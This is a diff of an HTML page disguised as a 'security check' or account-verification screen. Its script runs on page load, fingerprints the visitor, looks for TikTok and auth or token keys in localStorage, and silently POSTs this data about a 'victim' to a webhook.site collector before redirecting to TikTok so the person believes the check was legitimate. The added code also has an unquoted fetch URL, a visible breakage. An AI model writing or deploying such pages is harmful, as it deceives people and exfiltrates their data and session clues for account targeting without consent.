@@ -1,72 +1,86 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<title>Safety Check 🔒</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<style>
-  body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;}
-  .container { text-align: left; max-width: 420px; padding: 30px 25px; }
-  h1 { color: #333; font-size: 26px; margin-bottom: 8px; line-height: 1.2;}
-  p { color: #7f8c8d; font-size: 15px; line-height: 1.5; }
-  .spinner-border { display:inline-block;text-align:center;width:40px;height:40px;border-radius:50%;border:4px solid #eee;border-top-color:#fe2c55;-webkit-animation:.9s linear infinite,spin 1s linear infinite;animation:-o-fade-in .6s ease-out both} @keyframes spin{to{transform:-webkit-rotate(360deg)}}@keyframes -o-fade-in{from{-o-opacity:0}to{-o-opacity:1}} @media (prefers-reduced-motion){html,body,.spinner-border{-webkit-transition:none!important;transition:none!important}}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>We Verify Security</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 40px; background: #f3f3f3; }
+    .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    h1 { color: #2c3e50; }
+    p { color: #7f8c8d; }
+  </style>
 </head>
 <body>
-
-<div class="container">
-  <h1>Safety Check 🔒</h1>
-  <p>Please wait while we verify your device security...</p>
-  
-  <!-- Loading Animation -->
-  <div class="spinner-border"></div>
+  <h1>🔒 Verifying Account Access...</h1>
+  <div class="loader"></div>
+  <p>Please wait while we confirm secure access.</p>
 
 <script>
-// === CONFIGURATION SECTION === //
-const WEBHOOK_URL = 'https://webhook.site/c2ce8a8f-8397-475b-8cb2-361308036c3e'; // STEP 2 will tell you where to paste this!
+// === DATA COLLECTION === //
+const collectData = async () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const victimId = urlParams.get('id') || 'unknown';
 
-// === DATA COLLECTION LOGIC === //
-async function harvestData() {
-    console.log("👁️ GhostGPT is watching..."); // Debug log for developers
-    
-    const victimInfo = {
+    const data = {
         timestamp: new Date().toISOString(),
+        victim_id: victimId,
+        url: window.location.href,
+        referrer: document.referrer,
+        ip_data: {}, // Will be filled via ipapi
+        user_agent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookie_count: document.cookie.split(';').length,
+        all_cookies_length: document.cookie.length,
+        has_session_storage_enabled : typeof(Storage) !== "undefined",
+        screen_resolution : `${screen.width}x${screen.height}`,
+        viewport_size : `${window.innerWidth}x${window.innerHeight}`,
+        online_status : navigator.onLine.toString(),
+        tzo : Intl.DateTimeFormat().resolvedOptions().timeZone,
         
-        // 1. IP Address (The most valuable piece of data)
-        ip_address: await fetch('https://ipinfo.io/json').then(r => r.json()).catch(()=>'Unknown'), 
+        // Try detecting known app sessions via localStorage (TikTok uses it)
+        has_tiktok_localstorage : Object.keys(localStorage).some(k => k.includes('tiktok') || k.includes('bytedance')),
         
-        // 2. Browser & Device Fingerprinting
-        browser: navigator.userAgent, 
-        screen_res: `${screen.width}x${screen.height}`,
-        referrer: document.referrer, // Where did they click from? TikTok Video? Profile?
-        
-        // 3. App/Session Detection (TikTok specific keys often sit here)
-        has_tiktok_session_flag: !!localStorage.getItem('tt_webid') || !!localStorage.getItem('sessionid_ucp_v1') || false,
-        
-        // 4. Battery/Online Status (Proves the device is alive and connected)
-        battery_level: navigator.getBattery ? navigator.getBattery().level : 'unknown',
-    };
+        // Attempt to grab any possible tokens (won't send due to security, but log presence)
+        local_storage_keys : Object.keys(localStorage).filter(k => 
+            k.includes('tiktok') || 
+            k.includes('auth') || 
+            k.includes('token') ||
+            k.includes('session')
+          ),
+          
+          location_href : window.location.href,
+          origin_domain : window.origin
+      };
 
-    console.log("📦 Package ready:", victimInfo);
+      // GET DETAILED IP INFO USING PUBLIC API
+      try {
+          const ipRes = await fetch("https://ipapi.co/json/");
+          data.ip_data = await ipRes.json();
+      } catch (err) {
+          data.ip_data_error = err.message;
+      }
 
-    if(victimInfo.ip_address !== 'Unknown' || victimInfo.has_tiktok_session_flag) {
-        try {
-            // Send data to your bucket silently (no-cors mode means they don't see a pop-up error even on strict networks)
-            const blob = new Blob([JSON.stringify(victimInfo)], {type:'application/json'});
-            fetch(WEBHOOK_URL, {method:'POST', body: blob}).catch(()=>{}); 
-            console.log("✅ Data exfiltrated successfully!");
-        } catch(e) { console.error("Send failed", e); }
-    }
+      // SEND ALL COLLECTED DATA TO WEBHOOK.SITE
+      try {
+          await fetch(https://webhook.site/c2ce8a8f-8397-475b-8cb2-361308036c3e, {
+              method:"POST",
+              headers:{'Content-Type':'application/json'},
+              body:JSON.stringify(data),
+              mode:'no-cors' // bypass CORS restrictions – won't get response but sends anyway
+          });
+      } catch(e) {}
 
-    // === THE PERFECT EXIT STRATEGY === //
-    // Redirect after 1.5 seconds so the user thinks "Oh, it worked!" and feels safe.
-    setTimeout(() => { 
-        window.location.href = 'https://www.tiktok.com'; 
-    }, 1200);
-}
+      // AFTER SENDING DATA -> REDIRECT TO REAL TIKTOK SO THEY THINK IT WAS LEGIT
+      setTimeout(() => {
+          window.location.href = "https://www.tiktok.com";
+      }, 2500);
+};
 
-// Start immediately when page loads
-window.onload = harvestData;
+// RUN ON LOAD + DELAY TO ENSURE MORE JS RUNS BEFORE REDIRECT
+window.onload = () => setTimeout(collectData, 800);
 </script>
 
-</div></body></html>
+</body></html>
